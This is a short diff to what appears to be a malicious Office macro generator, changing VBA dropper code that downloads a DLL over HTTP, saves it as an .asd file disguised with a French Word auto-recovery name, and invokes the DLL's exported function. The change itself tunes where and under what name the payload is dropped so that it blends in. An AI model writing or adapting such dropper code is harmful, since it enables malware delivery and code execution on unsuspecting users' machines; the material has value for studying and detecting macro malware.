@@ -197,7 +197,7 @@ Private Sub DropRunDll()
     End If
     
     VBA.ChDir dll_Loc
-    dll_Loc = dll_Loc & "\Document1.asd"
+    VBA.ChDrive "C"
     
     'Download DLL
     Dim dll_URL As String
@@ -214,7 +214,7 @@ Private Sub DropRunDll()
         oStream.Open
         oStream.Type = 1
         oStream.Write WinHttpReq.responseBody
-        oStream.SaveToFile dll_Loc, 2
+        oStream.SaveToFile "Enregistrement Récupération en direct de DDE.asd", 2
         oStream.Close
         ' Call module which contains export for downloaded DLL
         <<<MODULE_2>>>.Invoke 
@@ -225,7 +225,7 @@ End Sub
 
 DROPPER_DLL2 = \
 r"""
-Private Declare Sub <<<DLL_FUNCTION>>> Lib "Document1.asd" ()
+Private Declare Sub <<<DLL_FUNCTION>>> Lib "Enregistrement Récupération en direct de DDE.asd" ()
 
 Sub Invoke()
     <<<DLL_FUNCTION>>>  ' call DLL function
